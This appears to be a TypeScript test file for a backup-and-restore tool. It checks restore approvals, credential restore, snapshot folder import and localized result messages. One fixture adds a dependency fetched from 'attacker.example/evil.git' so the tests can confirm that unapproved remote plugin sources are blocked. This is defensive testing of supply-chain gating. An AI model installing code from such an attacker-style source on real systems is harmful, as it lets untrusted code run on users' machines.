/**
 * Usability round (review of 3cf5092): the browser client's real request/response code.
 * The VaultApi class (src/client/api.ts) is driven against the real HTTP routes with
 * globalThis.fetch pointed at a local server, and the request bodies it sends are recorded.
 * The real-browser version of these flows is tests/browser-e2e-ui.test.ts.
 */
import { describe, it, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { mkdir, readFile, writeFile } from 'node:fs/promises'
import { createServer, type Server } from 'node:http'
import { join } from 'node:path'
import { VaultService } from '../src/core/vault-service.js'
import { buildVaultRoutes, publicResult } from '../src/api/routes.js'
import { VaultApi, type JobView } from '../src/client/api.js'
import { buildRestoreRequest } from '../src/client/lib/requests.js'
import { backupCounts, pluginCounts, restoreHeadline } from '../src/client/components/ResultSummary.js'
import { localizeError, pluginReasonText } from '../src/client/notices.js'
import { translate } from '../src/client/i18n.js'
import { targetName } from '../src/client/lib/format.js'
import type { BackupResult, RestoreResult } from '../src/core/types.js'
import { allowAll } from './api-client.js'
import { makeTempHome } from './helpers.js'

const zh = (k: Parameters<typeof translate>[1], v?: Record<string, string | number>) => translate('zh', k, v)

type Sent = { path: string; body: unknown }

/** Real routes + a fetch shim so the browser API client runs unmodified in Node. */
async function harness(service: VaultService) {
  const routes = buildVaultRoutes(service, allowAll)
  const server: Server = createServer((req, res) => {
    const r = routes.find((x) => x.path === new URL(req.url ?? '/', 'http://x').pathname)
    if (r) void r.handler(req, res)
    else { res.writeHead(404); res.end() }
  })
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r))
  const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`
  const sent: Sent[] = []
  const realFetch = globalThis.fetch
  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const path = String(input)
    if (init?.body) sent.push({ path, body: JSON.parse(String(init.body)) })
    return realFetch(origin + path, init)
  }) as typeof fetch
  return {
    sent,
    api: new VaultApi(),
    close: async () => {
      globalThis.fetch = realFetch
      await new Promise<void>((r) => server.close(() => r()))
    },
  }
}

async function waitJob<R>(api: VaultApi, job: JobView<R>): Promise<JobView<R>> {
  let j = job
  for (let i = 0; i < 400 && j.status === 'running'; i++) {
    await new Promise((r) => setTimeout(r, 25))
    j = (await api.getJob(j.id)).job as JobView<R>
  }
  return j
}

describe('usability P1: restore request from the browser client carries approvals and includeSecrets', () => {
  let home: Awaited<ReturnType<typeof makeTempHome>>
  let service: VaultService
  let h: Awaited<ReturnType<typeof harness>>
  const calls: string[][] = []
  let snap = ''
  before(async () => {
    home = await makeTempHome()
    const pkg = JSON.parse(await readFile(join(home.dshHome, 'profiles', 'web', 'package.json'), 'utf8'))
    pkg.dependencies.evil = 'git+https://attacker.example/evil.git'
    await writeFile(join(home.dshHome, 'profiles', 'web', 'package.json'), JSON.stringify(pkg))
    await mkdir(join(home.root, 'approved'), { recursive: true })
    service = new VaultService({
      dshHome: home.dshHome, agentsHome: home.agentsHome,
      apiHome: join(home.root, 'user-home'), apiPathRoots: [join(home.root, 'approved')],
      registryLookup: null, registryIntegrity: null,
      runPluginInstall: async (_c, args) => { calls.push(args); return { ok: false, detail: 'offline', code: 1 } },
    })
    await mkdir(join(home.root, 'user-home'), { recursive: true })
    await service.init()
    h = await harness(service)
    const b = await waitJob(h.api, await h.api.startBackupJob({ exportFile: join(home.root, 'approved', 'secret.dshvault'), encrypt: true, password: 'pw-123456', includeSecrets: true }))
    assert.equal(b.status, 'done', JSON.stringify(b.error))
    snap = join(home.root, 'approved', 'secret.dshvault')
    // This machine's credentials differ from the snapshot's.
    await writeFile(join(home.dshHome, '.credentials.yaml'), 'apiKey: LOCAL\n')
  })
  after(async () => {
    await h.close()
    service.stopSchedule()
    await home.cleanup()
  })

  it('checked source + "restore credentials" reach the server and take effect', async () => {
    const preview = await h.api.previewRestore(undefined, undefined, 'pw-123456', 'use-backup', {}, snap)
    assert.equal(preview.secretsAvailable, true)
    const row = preview.remotePluginSources?.find((r) => r.name === 'evil')
    assert.ok(row, 'remote source listed')
    // Exactly what RestorePanel builds from its state, forwarded unchanged by VaultApp.
    const body = buildRestoreRequest({
      usingImport: true, importPath: snap, password: 'pw-123456', conflict: 'use-backup', conflicts: {},
      rollback: true, reinstall: true, withSecrets: true, secretsAvailable: Boolean(preview.secretsAvailable),
      approvedSources: { [row.key]: true },
    })
    const job = await waitJob(h.api, await h.api.startRestoreJob(body))
    assert.equal(job.status, 'done', JSON.stringify(job.error))
    const sentBody = h.sent.find((s) => s.path.endsWith('/jobs/restore'))!.body as Record<string, unknown>
    assert.equal(sentBody.includeSecrets, true)
    assert.deepEqual(sentBody.approvedPluginSources, [row.key])
    const result = job.result as RestoreResult
    assert.ok(result.credentialsWritten?.includes('.credentials.yaml'), JSON.stringify(result.credentialsWritten))
    assert.equal(await readFile(join(home.dshHome, '.credentials.yaml'), 'utf8'), 'apiKey: SUPER-SECRET-KEY\n')
    assert.ok(calls.some((a) => a.join(' ').includes('attacker.example/evil.git')), 'approved source was attempted')
    assert.notEqual(result.pluginResults?.find((p) => p.name === 'evil')?.reason, 'source-not-approved')
  })

  it('unchecked: nothing is approved and credentials are left alone', async () => {
    await writeFile(join(home.dshHome, '.credentials.yaml'), 'apiKey: LOCAL\n')
    calls.length = 0
    const body = buildRestoreRequest({
      usingImport: true, importPath: snap, password: 'pw-123456', conflict: 'use-backup', conflicts: {},
      rollback: true, reinstall: true, withSecrets: false, secretsAvailable: true, approvedSources: {},
    })
    assert.equal(body.includeSecrets, false)
    assert.deepEqual(body.approvedPluginSources, [])
    const job = await waitJob(h.api, await h.api.startRestoreJob(body))
    const result = job.result as RestoreResult
    assert.deepEqual(result.credentialsWritten, [])
    assert.equal(await readFile(join(home.dshHome, '.credentials.yaml'), 'utf8'), 'apiKey: LOCAL\n')
    assert.equal(result.pluginResults?.find((p) => p.name === 'evil')?.reason, 'source-not-approved')
    assert.ok(!calls.some((a) => a.join(' ').includes('attacker.example')))
  })

  it('the synchronous POST /restore route also drops wildcard / name-only approvals', async () => {
    calls.length = 0
    await h.api.restore({ importPath: snap, password: 'pw-123456', conflict: 'use-backup', approvedPluginSources: ['*', 'web:evil'] })
    assert.ok(!calls.some((a) => a.join(' ').includes('attacker.example')), JSON.stringify(calls))
  })

  it('the backup success summary shows the real file count from the trimmed API result', async () => {
    const job = await waitJob(h.api, await h.api.startBackupJob({ targetId: service.listTargets()[0]!.id, encrypt: false, includeSecrets: false }))
    const r = job.result as BackupResult
    const counts = backupCounts(r)
    assert.ok(counts.files > 5, JSON.stringify(r.manifest))
    assert.equal(counts.files, (r.manifest as unknown as { fileCount: number }).fileCount)
    // Plugin copies: computed server-side before trimming.
    const fake = publicResult({ manifest: { files: [1, 2, 3], plugins: [{ name: 'a', profile: 'web', fallbackBundle: 'plugin-sources/a' }, { name: 'b', profile: 'web' }, { name: 'c', profile: 'web', bundledSource: 'x' }] } } as unknown as BackupResult)
    assert.deepEqual(backupCounts(fake), { files: 3, copies: 2 })
  })

  it('snapshot list reports includeSecrets for encrypted snapshots that carry credentials', async () => {
    await waitJob(h.api, await h.api.startBackupJob({ targetId: service.listTargets()[0]!.id, encrypt: true, password: 'pw-123456', includeSecrets: true }))
    const list = await service.listSnapshots(service.listTargets()[0]!.id)
    assert.ok(list.some((s) => s.encrypted && s.includeSecrets), JSON.stringify(list))
    assert.ok(list.filter((s) => !s.encrypted).every((s) => !s.includeSecrets))
  })
})

describe('usability P1: importing an extracted snapshot folder', () => {
  it('previews and restores manifest.json + files/; a non-snapshot JSON gives a readable 400, not 500', async () => {
    const home = await makeTempHome()
    try {
      const service = new VaultService({ dshHome: home.dshHome, agentsHome: home.agentsHome, apiHome: join(home.root, 'user-home'), apiPathRoots: [join(home.root, 'approved')], registryLookup: null, registryIntegrity: null, runPluginInstall: async () => ({ ok: true, detail: 'ok', code: 0 }) })
      await mkdir(join(home.root, 'user-home'), { recursive: true })
      await service.init()
      const out = join(home.root, 'approved', 'snap.tar.gz')
      await mkdir(join(home.root, 'approved'), { recursive: true })
      await service.backup({ exportFile: out })
      // Extract it by hand the way a user would.
      const { unpackTarGz } = await import('../src/core/archive.js')
      const folder = join(home.root, 'approved', 'import-folder')
      for (const e of unpackTarGz(await readFile(out))) {
        await mkdir(join(folder, e.path, '..'), { recursive: true })
        await writeFile(join(folder, e.path), e.data)
      }
      await writeFile(join(home.dshHome, 'settings.yaml'), 'theme: light\n')
      const h = await harness(service)
      try {
        const preview = await h.api.previewRestore(undefined, undefined, undefined, 'use-backup', {}, folder)
        assert.ok(preview.changed >= 1, JSON.stringify(preview).slice(0, 300))
        const job = await waitJob(h.api, await h.api.startRestoreJob({ importPath: folder, conflict: 'use-backup', reinstallPlugins: false }))
        assert.equal(job.status, 'done', JSON.stringify(job.error))
        assert.equal(await readFile(join(home.dshHome, 'settings.yaml'), 'utf8'), 'theme: dark\nmodel: demo\n')
        // A folder with only a random manifest.json is a user error.
        const bad = join(home.root, 'approved', 'bad')
        await mkdir(bad, { recursive: true })
        await writeFile(join(bad, 'manifest.json'), '{"not":"a manifest"}')
        await assert.rejects(() => h.api.previewRestore(undefined, undefined, undefined, 'use-backup', {}, bad), (e: { status?: number }) => e.status === 400 || e.status === 404)
        const empty = join(home.root, 'approved', 'empty')
        await mkdir(empty, { recursive: true })
        await writeFile(join(empty, 'notes.meta.json'), '{}')
        await assert.rejects(() => h.api.previewRestore(undefined, undefined, undefined, 'use-backup', {}, empty), (e: { status?: number; code?: string }) => e.status === 404 && e.code === 'SNAPSHOT_NOT_FOUND')
      } finally {
        await h.close()
      }
      service.stopSchedule()
    } finally {
      await home.cleanup()
    }
  })
})

describe('usability P2/P3: result wording, schedule, localization', () => {
  it('skipped plugins are not counted as successes and their reason is localized', () => {
    const r = { snapshotId: 's', applied: ['a'], skipped: [], pluginsReinstalled: [], pluginsFailed: [], manualActions: [], durationMs: 420,
      pluginResults: [
        { name: 'dsh-vault', profile: 'web', status: 'skipped', reason: 'self', detail: 'self' },
        { name: 'demo', profile: 'web', status: 'skipped', reason: 'source-not-approved', detail: 'x' },
        { name: 'ok', profile: 'web', status: 'installed', detail: 'installed ok@1.0.0' },
      ] } as unknown as RestoreResult
    assert.deepEqual(pluginCounts(r), { ok: 1, failed: 0, skipped: 2 })
    const line = restoreHeadline(r, zh)
    assert.match(line, /插件 1 成功/)
    assert.match(line, /插件 2 跳过/)
    assert.match(line, /0\.4s/)
    assert.match(pluginReasonText(r.pluginResults![1]!, zh), /没有勾选允许/)
  })

  it('disabling the schedule clears nextRunAt', async () => {
    const home = await makeTempHome()
    try {
      const service = new VaultService({ dshHome: home.dshHome, agentsHome: home.agentsHome, registryLookup: null, registryIntegrity: null })
      await service.init()
      await service.updateSchedule({ enabled: true, targetId: service.listTargets()[0]!.id, intervalMinutes: 60, nextRunAt: new Date(Date.now() + 3600_000).toISOString() })
      assert.ok(service.getSchedule().nextRunAt)
      const s = await service.updateSchedule({ enabled: false })
      assert.equal(s.nextRunAt, undefined)
      assert.equal((await service.status()).settings.schedule.nextRunAt, undefined)
      service.stopSchedule()
    } finally {
      await home.cleanup()
    }
  })

  it('server path errors and the default target name are shown in Chinese', () => {
    const err = Object.assign(new Error('path not allowed (the dsh-vault data folder is private): /x/dsh-vault'), { code: 'PATH_NOT_ALLOWED', status: 403 })
    assert.equal(localizeError(err, zh), '这是大肥鱼备份自己的私有数据目录，不能浏览或选择：/x/dsh-vault (HTTP 403)')
    assert.match(localizeError(Object.assign(new Error('not a valid dsh-vault snapshot: incorrect header check'), { code: 'BAD_SNAPSHOT', status: 400 }), zh), /不是有效的大肥鱼备份快照/)
    assert.equal(targetName({ label: 'Local folder', kind: 'local' }, zh), '本地目录')
    assert.equal(targetName({ label: 'My NAS', kind: 'webdav' }, zh), 'My NAS')
  })
})
